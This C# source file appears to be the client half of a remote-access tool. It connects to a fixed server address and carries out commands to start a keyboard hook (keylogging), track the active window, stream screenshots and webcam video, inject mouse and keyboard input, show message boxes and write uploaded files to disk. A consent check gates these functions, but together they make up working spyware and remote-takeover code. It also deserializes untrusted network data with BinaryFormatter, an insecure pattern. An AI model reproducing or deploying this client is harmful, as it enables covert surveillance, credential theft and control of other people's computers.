using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Threading;
using NAudio.Wave;
using RemoteClient.Camera;
using RemoteClient.Core;
using Encoder = System.Drawing.Imaging.Encoder;
using Timer = System.Threading.Timer;

namespace RemoteClient
{
    public class RemoteClient
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }
        [DllImport("user32.dll")]
        private static extern bool SetForegroundWindow(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern IntPtr GetWindowDC(IntPtr hWnd);

        [DllImport("gdi32.dll")]
        private static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest,
            int width, int height, IntPtr hdcSrc, int xSrc, int ySrc, CopyPixelOperation rop);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("user32.dll")]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
        private const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
        private const uint MOUSEEVENTF_LEFTUP = 0x0004;
        private const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
        private const uint MOUSEEVENTF_RIGHTUP = 0x0010;
        private static NetworkStream ns;
        private static TcpClient server;
        private BinaryWriter bWrite;
        // private ChatForm chatForm;
        private Thread chatThread;
        private int depth = 70;
        private Dispatcher dispatcher;


        private readonly bool distruct = false;
        private FoundInfoSyncHandler FoundInfo;
        // private ClipHook hookboard;
        private bool isfile, arun;
        private bool isRemoteControlActive;
        private TreeNode node;
        // private DeviceNotification notifier;
        private bool olReceived, shot = false;
        private Thread realTimeScreenShootThread;
        private Thread realTimeTrackerThread;

        private int remoteControlQuality = 100;

        // Add these fields at the class level
        private Timer remoteControlTimer;
        private bool remoteInteractionEnabled = true;
        private int screenShootUpdateTime = 100; //10 fps
        private ThreadEndedSyncHandler ThreadEnded;
        private ActiveWindowTracker tracker;
        private WaveInEvent waveIn;
        private Webcam webcam;
        
        private delegate void FoundInfoSyncHandler(FoundInfoEventArgs e);

        private delegate void ThreadEndedSyncHandler(ThreadEndedEventArgs e);


        public RemoteClient()
        {
            FoundInfo += this_FoundInfo;
            ThreadEnded += this_ThreadEnded;

            Searcher.FoundInfo += Searcher_FoundInfo;
            Searcher.ThreadEnded += Searcher_ThreadEnded;

            Application.ApplicationExit += agent_exit;

            dispatcher = Dispatcher.CurrentDispatcher;

            // Only start client if consent is given
            if (ConsentManager.ConsentGiven)
            {
                var t = new Thread(StartClient);
                t.SetApartmentState(ApartmentState.STA);
                t.Start();
            }
        }


// P/Invoke declarations
        [DllImport("user32.dll")]
        private static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        private static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, int dwExtraInfo);

        private void agent_exit(object sender, EventArgs e)
        {
            SendMessage(new DataObject
            {
                CommandType = "Self",
                CommandName = "result",
                CommandData = "Remote Client is terminated Reason can be any thing!"
            });
        }

        private void StartClient()
        {
            while (true)
            {
                if (!ConsentManager.ConsentGiven || distruct)
                    break;

                while (true)
                {
                    if (!ConsentManager.ConsentGiven || distruct)
                        break;

                    try
                    {
                        server = new TcpClient(GetIpAddress(), 9911);
                        break;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }

                    //}
                    try
                    {
                        if (IsSocketConnected(server.Client)) break;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }

                    Thread.Sleep(1000);
                }

                ns = server.GetStream();

                var state = new StateObject();
                state.workSocket = server.Client;
                server.Client.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                    OnReceive, state);

                while (true)
                {
                    try
                    {
                        if (!IsSocketConnected(server.Client)) break;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                        break;
                    }

                    Thread.Sleep(1000);
                }

                StopRunningThreads();
                ns.Close();
                server.Close();
            }
        }

        private string GetIpAddress()
        {
            return "192.168.1.9";
        }

        private void StopRunningThreads()
        {
            if (realTimeScreenShootThread != null) realTimeScreenShootThread.Abort();
            if (realTimeTrackerThread != null) realTimeTrackerThread.Abort();
        }

        private void Tracker()
        {
            tracker = new ActiveWindowTracker();
            arun = true;
            while (arun)
                try
                {
                    tracker.WriteCurrentWindowInformation();
                }
                catch (Exception ex)
                {
                    LogError(ex.ToString());
                }
        }

        private bool IsSocketConnected(Socket s)
        {
            var part1 = s.Poll(1000, SelectMode.SelectRead);
            var part2 = s.Available == 0;
            if ((part1 && part2) || !s.Connected)
                return false;
            return true;
        }

        private void Searcher_FoundInfo(FoundInfoEventArgs e)
        {
            this_FoundInfo(e);
        }

        private void this_FoundInfo(FoundInfoEventArgs e)
        {
            // Create a new item in the results list:
            SendMessage(new DataObject { CommandType = "SRCH", CommandName = "FF", CommandData = e.Info });
        }

        private void Searcher_ThreadEnded(ThreadEndedEventArgs e)
        {
            this_ThreadEnded(e);
        }

        private void this_ThreadEnded(ThreadEndedEventArgs e)
        {
            // Show an error message if necessary:
            if (!e.Success)
                SendMessage(new DataObject
                {
                    CommandType = "SRCH",
                    CommandName = "EEND",
                    CommandData = e.ErrorMsg
                });
            else
                SendMessage(new DataObject
                {
                    CommandType = "SRCH",
                    CommandName = "END",
                    CommandData = "Search Ended"
                });
        }

        [STAThread]
        private void OnReceive(IAsyncResult ar)
        {
            if (!ConsentManager.ConsentGiven)
                return;
            var content = string.Empty;
            var state = (StateObject)ar.AsyncState;
            var handler = state.workSocket;
            int bytesRead;

            if (handler.Connected)
                // Read data from the client socket. 
                try
                {
                    bytesRead = handler.EndReceive(ar);
                    if (bytesRead > 0)
                    {
                        var bytesRemains = bytesRead;
                        var bytesProcess = 0;

                        while (bytesRemains > 0)
                            if (isfile)
                            {
                                if (state.fileSizeReceived < state.fileInfo.Length)
                                {
                                    byte[] buffer;
                                    long rl;
                                    if (bytesRemains > state.fileInfo.Length - state.fileSizeReceived)
                                        rl = state.fileInfo.Length - state.fileSizeReceived;
                                    else
                                        rl = bytesRemains;
                                    buffer = new byte[rl];
                                    try
                                    {
                                        Buffer.BlockCopy(state.buffer, bytesProcess, buffer, 0, (int)rl);
                                        bWrite.Write(state.buffer, 0, (int)rl);
                                    }
                                    catch (Exception ex)
                                    {
                                        Debug.WriteLine(ex);
                                    }

                                    bytesProcess += (int)rl;
                                    state.fileSizeReceived += (int)rl;
                                    bytesRemains = bytesRead - bytesProcess;

                                    if (state.fileSizeReceived == state.fileInfo.Length)
                                    {
                                        isfile = false;
                                        state.fileSizeReceived = 0;
                                        state.fileInfo = null;
                                        bWrite.Flush();
                                        bWrite.Close();
                                        bWrite.Dispose();
                                    }
                                }
                            }
                            else
                            {
                                if (!olReceived)
                                {
                                    var temp = new byte[4];
                                    try
                                    {
                                        Buffer.BlockCopy(state.buffer, bytesProcess, temp, 0, 4);
                                    }
                                    catch (Exception ex)
                                    {
                                        Debug.WriteLine(ex.Message, "Error");
                                    }

                                    state.ol = BitConverter.ToInt32(temp, 0);
                                    olReceived = true;
                                    bytesProcess += 4;
                                    bytesRemains = bytesRead - bytesProcess;
                                }
                                else
                                {
                                    if (state.bab.Length < state.ol)
                                    {
                                        byte[] temp;
                                        int rl;
                                        if (bytesRemains > state.ol - state.bab.Length)
                                            rl = state.ol - state.bab.Length;
                                        else
                                            rl = bytesRemains;

                                        temp = new byte[rl];
                                        try
                                        {
                                            Buffer.BlockCopy(state.buffer, bytesProcess, temp, 0, rl);
                                        }
                                        catch (Exception ex)
                                        {
                                            Debug.WriteLine(ex.Message, "Error");
                                        }

                                        state.bab.Append(temp);
                                        bytesProcess += rl;
                                        bytesRemains = bytesRead - bytesProcess;
                                        if (state.bab.Length == state.ol)
                                            try
                                            {
                                                var d = (DataObject)ByteArrayToObject(state.bab.ToArray());

                                                olReceived = false;
                                                state.bab.Clear();

                                                if (d.CommandType == "FILE")
                                                {
                                                    isfile = true;
                                                    state.fileInfo = (FileInfo)((object[])d.CommandData)[1];
                                                    bWrite =
                                                        new BinaryWriter(File.Open(
                                                            ((object[])d.CommandData)[0] + "\\" + state.fileInfo.Name,
                                                            FileMode.Append));
                                                }
                                                else
                                                {
                                                    ProcessCommand(d);
                                                }
                                            }
                                            catch (Exception ex)
                                            {
                                                LogError(ex.Message);
                                            }
                                    }
                                }
                            }

                        handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                            OnReceive, state);
                    }
                }

                catch (SocketException socketException)
                {
                    //WSAECONNRESET, the other side closed impolitely
                    if (socketException.ErrorCode == 10054 ||
                        (socketException.ErrorCode != 10004 && socketException.ErrorCode != 10053))
                    {
                        // Complete the disconnect request.
                        handler.Close();
                        handler = null;
                    }
                }

                // Eat up exception....Hmmmm I'm loving eat!!!
                catch (Exception exception)
                {
                    Console.WriteLine(exception.ToString());
                    handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0,
                        OnReceive, state);
                }
        }

        private void ProcessCommand(object ob)
        {
            if (!ConsentManager.ConsentGiven)
                return;
            var o = (DataObject)ob;
            
            if (o.CommandType == "RTL")
            {
                if (o.CommandName == "RTASTART")
                {
                    realTimeTrackerThread = new Thread(Tracker);
                    realTimeTrackerThread.Start();
                }
                else if (o.CommandName == "RTASTOP")
                {
                    arun = false;
                }
                else if (o.CommandName == "RTKLSTART")
                {
                    try
                    {
                        Program.InitHook();
                    }
                    catch (Exception ex)
                    {
                        LogError(ex.Message);
                    }
                }
                else if (o.CommandName == "RTKLSTOP")
                {
                    Program.Unhook();
                }
            }
           else if (o.CommandType == "ProcessScreenshot")
           {
               if (o.CommandName == "Capture")
                   try
                   {
                       string processId = o.CommandData is object[] dataArray
                           ? dataArray[0].ToString()
                           : o.CommandData.ToString();
           
                       Debug.WriteLine($"Taking optimized screenshot for process: {processId}");
           
                       // Get screen dimensions
                       Rectangle bounds = Screen.PrimaryScreen.Bounds;
                       int width = bounds.Width;
                       int height = bounds.Height;
           
                       // Create a scaled down version for faster transmission
                       int scaledWidth = width / 2;  // 50% of original width
                       int scaledHeight = height / 2; // 50% of original height
           
                       using (Bitmap fullBmp = new Bitmap(width, height))
                       using (Graphics g = Graphics.FromImage(fullBmp))
                       {
                           g.CopyFromScreen(0, 0, 0, 0, new Size(width, height));
           
                           // Create scaled bitmap
                           using (Bitmap scaledBmp = new Bitmap(scaledWidth, scaledHeight))
                           using (Graphics scaledG = Graphics.FromImage(scaledBmp))
                           {
                               // Set high speed, lower quality interpolation
                               scaledG.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Low;
                               scaledG.DrawImage(fullBmp, 0, 0, scaledWidth, scaledHeight);
           
                               byte[] imageBytes;
                               using (var ms = new MemoryStream())
                               {
                                   // Use lower JPEG quality and scaled image for faster transmission
                                   using (var encoderParams = new EncoderParameters(1))
                                   using (var qualityParam = new EncoderParameter(Encoder.Quality, 50L))
                                   {
                                       var jpegCodec = GetEncoderInfo("image/jpeg");
                                       encoderParams.Param[0] = qualityParam;
                                       scaledBmp.Save(ms, jpegCodec, encoderParams);
                                       imageBytes = ms.ToArray();
                                   }
                               }
           
                               SendMessage(new DataObject
                               {
                                   CommandType = "ProcessScreenshot",
                                   CommandName = "Result",
                                   CommandData = new object[] 
                                   { 
                                       processId, 
                                       imageBytes,
                                       new Size(scaledWidth, scaledHeight) // Send scaled dimensions
                                   }
                               });
           
                               Debug.WriteLine($"Optimized screenshot sent ({imageBytes.Length} bytes) for process: {processId}");
                           }
                       }
                   }
                   catch (Exception ex)
                   {
                       Debug.WriteLine($"Error taking screenshot: {ex.Message}");
                       SendMessage(new DataObject
                       {
                           CommandType = "ProcessScreenshot",
                           CommandName = "Error",
                           CommandData = new object[] { o.CommandData.ToString(), ex.Message }
                       });
                   }
           }
           
            else if (o.CommandType == "Webcam")
            {
                if (o.CommandName == "List")
                {
                    SendMessage(new DataObject
                    {
                        CommandName = "List",
                        CommandType = "Webcam",
                        CommandData = GetAllWebcams()
                    });
                }
                else if (o.CommandName == "choose")
                {
                    SetCamera((int)o.CommandData);
                }
                else if (o.CommandName == "Start")
                {
                    if (webcam != null) webcam.Start();
                }
                else if (o.CommandName == "Stop")
                {
                    if (webcam != null) webcam.Stop();
                }
                else if (o.CommandName == "depth")
                {
                    depth = (int)o.CommandData;
                }
            }
            else if (o.CommandType == "MessageBox")
            {
                if (o.CommandName == "show") ShowMessage(o.CommandData);
            }
            
            else if (o.CommandType == "Mouse")
            {
                MouseParser(o.CommandData, bool.Parse(o.CommandName));
            }
            else if (o.CommandType == "Keyboard")
            {
                if (o.CommandName == "send") issueKey(o.CommandData);
            }
            else if (o.CommandType == "RemoteControl")
            {
                switch (o.CommandName)
                {
                    case "Start":
                        // Start remote control session
                        var quality = 100; // Default quality
                        if (o.CommandData != null) int.TryParse(o.CommandData.ToString(), out quality);
                        StartRemoteControlSession(quality);
                        break;

                    case "Stop":
                        StopRemoteControlSession();
                        break;

                    case "GetScreen":
                        SendScreenToServer();
                        break;

                    case "Quality":
                        if (o.CommandData != null)
                        {
                            int.TryParse(o.CommandData.ToString(), out var newQuality);
                            remoteControlQuality = newQuality;
                        }

                        break;

                    case "MouseMove":
                        if (o.CommandData != null && remoteInteractionEnabled)
                        {
                            var coordinates = o.CommandData.ToString().Split(',');
                            if (coordinates.Length >= 2)
                            {
                                var x = int.Parse(coordinates[0]);
                                var y = int.Parse(coordinates[1]);
                                SimulateMouseMove(x, y);
                            }
                        }

                        break;

                    case "MouseClick":
                        if (o.CommandData != null && remoteInteractionEnabled)
                        {
                            var parts = o.CommandData.ToString().Split(',');
                            if (parts.Length >= 3)
                            {
                                var x = int.Parse(parts[0]);
                                var y = int.Parse(parts[1]);
                                var button = parts[2];
                                SimulateMouseClick(x, y, button);
                            }
                        }

                        break;

                    case "EnableInteraction":
                        remoteInteractionEnabled = true;
                        break;

                    case "DisableInteraction":
                        remoteInteractionEnabled = false;
                        break;
                }
            }
            else if (o.CommandType == "ProcessExit")
            {
                try
                {
                    // Ensure the command data is valid
                    if (o.CommandData == null)
                    {
                        Debug.WriteLine("Error: ProcessExit command received with null CommandData");
                        return;
                    }

                    var processId = o.CommandData.ToString();
                    var timeOut = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");

                    // Send message back to server to update the timeout
                    SendMessage(new DataObject
                    {
                        CommandType = "ProcessExit",
                        CommandName = "Update",
                        CommandData = new object[] { processId, timeOut }
                    });

                    Debug.WriteLine($"Process exit notification sent for PID: {processId}, TimeOut: {timeOut}");
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Error handling ProcessExit command: {ex.Message}");

                    // Send error notification back to server
                    SendMessage(new DataObject
                    {
                        CommandType = "ProcessExit",
                        CommandName = "Error",
                        CommandData = $"Error: {ex.Message}"
                    });
                }
            }
        }

        private void issueKey(object o)
        {
            try
            {
                SendKeys.Send((string)o);
            }
            catch (Exception e)
            {
                LogError(e.Message);
            }
        }


        private void ShowMessage(object p)
        {
            try
            {
                var data = (string[])p;
                var times = int.Parse(data[1]);

                var btns = MessageBoxButtons.OK;
                if (data[2] == "Error" || data[2] == "Confirmation")
                    btns = MessageBoxButtons.YesNo;

                var ico = MessageBoxIcon.Information;
                if (data[2] == "Warning")
                    ico = MessageBoxIcon.Warning;
                else if (data[2] == "Confirmation")
                    ico = MessageBoxIcon.Question;
                else if (data[2] == "Error")
                    ico = MessageBoxIcon.Error;

                for (var i = 1; i <= times; i++)
                {
                    var rs = MessageBox.Show(data[0], data[2], btns, ico, MessageBoxDefaultButton.Button1,
                        MessageBoxOptions.ServiceNotification);
                    SendMessage(new DataObject
                    {
                        CommandName = "Result",
                        CommandType = "MessageBox",
                        CommandData = rs.ToString()
                    });
                }
            }
            catch (Exception e)
            {
                LogError(e.Message);
            }
        }

        public static void LogError(string error)
        {
            error = DateTime.Now.ToShortTimeString() + " on " + DateTime.Today.ToShortDateString() +
                    Environment.NewLine + error;
            error = "Exception raised at " + error;

            SendMessage(new DataObject
            {
                CommandType = "LogBook",
                CommandData = error
            });
        }

        private void SetCamera(int index)
        {
            try
            {
                if (webcam != null) webcam.setCamera(index);
            }
            catch (Exception e)
            {
                LogError(e.Message);
            }
        }


        private object GetAllWebcams()
        {
            try
            {
                if (webcam == null)
                    webcam = new Webcam(depth);

                return webcam.Load().ToArray();
            }
            catch (Exception e)
            {
                LogError(e.ToString());
                return new[] { "Error Occured!" };
            }
        }


        private Point Translate(Point point, Size from, Size to)
        {
            return new Point(point.X * to.Width / from.Width, point.Y * to.Height / from.Height);
        }

        private void MouseParser(object obj, bool click)
        {
            try
            {
                if (!click)
                {
                    var o = (object[])obj;
                    var p = Translate((Point)o[0], (Size)o[1],
                        new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height));
                    Mouse.SetCursorPosition(p.X, p.Y);
                }
                else
                {
                    var tp = (string)obj;
                    if (tp == "rdown")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.RightDown);
                    else if (tp == "rup")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.RightUp);
                    else if (tp == "ldown")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.LeftDown);
                    else if (tp == "lup")
                        Mouse.MouseEvent(Mouse.MouseEventFlags.LeftUp);
                }
            }
            catch (Exception e)
            {
                LogError(e.ToString());
            }
        }
        
        public static void SendMessage(object msg)
        {
// Only send messages if consent is given
            if (ConsentManager.ConsentGiven) ThreadPool.QueueUserWorkItem(SendNow, msg);
        }

        private static void SendNow(object msg)
        {
            var seek = 0;
            const int count = 102400;

            try
            {
                var handler = server.Client;

                var b = new ByteArrayBuilder();
                b.Append(ObjectToByteArray(msg));

                var ol = BitConverter.GetBytes(b.Length);

                handler.BeginSend(ol, 0, ol.Length, 0, SendCallBack, handler);

                //count = b.Length;
                var length = b.Length;

                while (length > count)
                {
                    handler.BeginSend(b.ToArray(seek, count), 0, count, 0, SendCallBack, handler);
                    //handler.BeginSend(buffer, 0, count, 0, new AsyncCallback(SendCallBack), handler);
                    seek += count;
                    length = length - count;
                }

                handler.BeginSend(b.ToArray(seek, length), 0, length, 0, SendCallBack, handler);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }


        private static void SendCallBack(IAsyncResult ar)
        {
            try
            {
                var handler = (Socket)ar.AsyncState;
                var bytesSend = handler.EndSend(ar);
            }
            catch (Exception e)
            {
                Debug.WriteLine(e.Message, "Error");
            }
        }


        private static byte[] ObjectToByteArray(object obj)
        {
            try
            {
                if (obj == null)
                    return null;
                var bf = new BinaryFormatter();
                bf.AssemblyFormat = FormatterAssemblyStyle.Simple;
                var ms = new MemoryStream();
                bf.Serialize(ms, obj);
                return ms.ToArray();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, "Critical Error");
                return null;
            }
        }


        private object ByteArrayToObject(byte[] arrBytes)
        {
            try
            {
                var memStream = new MemoryStream();
                var binForm = new BinaryFormatter();
                binForm.AssemblyFormat = FormatterAssemblyStyle.Simple;
                binForm.Binder = new DeserializationBinder();
                memStream.Write(arrBytes, 0, arrBytes.Length);
                memStream.Seek(0, SeekOrigin.Begin);
                var obj = binForm.Deserialize(memStream);
                return obj;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }


        //=================remote control=========================
        private void StartRemoteControlSession(int quality)
        {
            try
            {
                remoteControlQuality = quality;
                isRemoteControlActive = true;

                // First send screen dimensions
                SendScreenInfo();

                // Then start sending screen captures periodically
                if (remoteControlTimer == null)
                    remoteControlTimer = new Timer(
                        _ => SendScreenToServer(), null, 0, 200); // 5 fps
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error starting remote control: {ex.Message}");
            }
        }

        private void StopRemoteControlSession()
        {
            try
            {
                isRemoteControlActive = false;

                if (remoteControlTimer != null)
                {
                    remoteControlTimer.Dispose();
                    remoteControlTimer = null;
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error stopping remote control: {ex.Message}");
            }
        }

        private void SendScreenInfo()
        {
            try
            {
                var screenSize = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

                // Send screen dimensions to server
                SendMessage(new DataObject
                {
                    CommandType = "RemoteControl",
                    CommandName = "ScreenInfo",
                    CommandData = screenSize
                });
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error sending screen info: {ex.Message}");
            }
        }

        private void SendScreenToServer()
        {
            if (!isRemoteControlActive) return;

            try
            {
                // Capture the screen
                using (var screenshot =
                       new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
                {
                    using (var g = Graphics.FromImage(screenshot))
                    {
                        g.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
                    }

                    // Resize if needed for better performance
                    var resized = screenshot;
                    var maxWidth = 1280; // Adjust as needed

                    if (screenshot.Width > maxWidth)
                    {
                        var newHeight = (int)(screenshot.Height * ((float)maxWidth / screenshot.Width));
                        resized = new Bitmap(screenshot, new Size(maxWidth, newHeight));
                    }

                    // Compress the image
                    using (var ms = new MemoryStream())
                    {
                        var encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(Encoder.Quality, remoteControlQuality);

                        var jpegEncoder = GetEncoder(ImageFormat.Jpeg);
                        resized.Save(ms, jpegEncoder, encoderParams);

                        var imageBytes = ms.ToArray();

                        // Send image data with dimensions
                        SendMessage(new DataObject
                        {
                            CommandType = "RemoteControl",
                            CommandName = "ScreenData",
                            CommandData = new object[]
                            {
                                imageBytes,
                                Screen.PrimaryScreen.Bounds.Width,
                                Screen.PrimaryScreen.Bounds.Height
                            }
                        });
                    }

                    if (resized != screenshot) resized.Dispose();
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error sending screen: {ex.Message}");
            }
        }

        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageDecoders();

            foreach (var codec in codecs)
                if (codec.FormatID == format.Guid)
                    return codec;

            return null;
        }

        private void SimulateMouseMove(int x, int y)
        {
            if (!remoteInteractionEnabled) return;

            try
            {
                SetCursorPos(x, y);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error simulating mouse move: {ex.Message}");
            }
        }

        private void SimulateMouseClick(int x, int y, string buttonName)
        {
            if (!remoteInteractionEnabled) return;

            try
            {
                // Move cursor to position first
                SetCursorPos(x, y);

                if (buttonName.Contains("Left"))
                {
                    mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
                    mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
                }
                else if (buttonName.Contains("Right"))
                {
                    mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
                    mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error simulating mouse click: {ex.Message}");
            }
        }

        //=================remote control=========================
        //=================== screenshot for each process==================
        private static ImageCodecInfo GetEncoderInfo(string mimeType)
        {
            var encoders = ImageCodecInfo.GetImageEncoders();

            for (var i = 0; i < encoders.Length; i++)
                if (encoders[i].MimeType == mimeType)
                    return encoders[i];

            return null;
        }

    }


    public class StateObject
    {
        public const int BufferSize = 102400;
        public ByteArrayBuilder bab = new ByteArrayBuilder();
        public byte[] buffer = new byte[BufferSize];
        public FileInfo fileInfo;
        public long fileSizeReceived;
        public int ol;
        public StringBuilder sb = new StringBuilder();
        public Socket workSocket;
    }

    #region Struct,Class

    public class Win32
    {
        public const uint SHGFI_ICON = 0x100;

        //public const uint SHGFI_LARGEICON = 0x0;    // 'Large icon
        public const uint SHGFI_SMALLICON = 0x1; // 'Small icon

        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(
            string pszPath,
            uint dwFileAttributes,
            ref SHFILEINFO psfi,
            uint cbSizeFileInfo,
            uint uFlags);

        [DllImport("kernel32")]
        public static extern uint GetDriveType(
            string lpRootPathName);

        [DllImport("shell32.dll")]
        public static extern bool SHGetDiskFreeSpaceEx(
            string pszVolume,
            ref ulong pqwFreeCaller,
            ref ulong pqwTot,
            ref ulong pqwFree);

        [DllImport("shell32.Dll")]
        public static extern int SHQueryRecycleBin(
            string pszRootPath,
            ref SHQUERYRBINFO pSHQueryRBInfo);

        [DllImport("comctl32.dll")]
        public static extern bool ImageList_Add(IntPtr hImageList, IntPtr hBitmap, IntPtr hMask);

        [DllImport("kernel32.dll")]
        private static extern bool RtlMoveMemory(IntPtr dest, IntPtr source, int dwcount);

        [DllImport("shell32.dll")]
        public static extern IntPtr DestroyIcon(IntPtr hIcon);

        [DllImport("gdi32.dll")]
        public static extern IntPtr CreateDIBSection(IntPtr hdc,
            [In] [MarshalAs(UnmanagedType.LPStruct)] BITMAPINFO pbmi,
            uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public IntPtr iIcon;
            public uint dwAttributes;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szDisplayName;

            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        }

        [StructLayout(LayoutKind.Sequential)]
        public class BITMAPINFO
        {
            public int biSize;
            public int biWidth;
            public int biHeight;
            public short biPlanes;
            public short biBitCount;
            public int biCompression;
            public int biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public int biClrUsed;
            public int biClrImportant;
            public int colors;
        }
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct SHQUERYRBINFO
    {
        public uint cbSize;
        public ulong i64Size;
        public ulong i64NumItems;
    }

    #endregion
}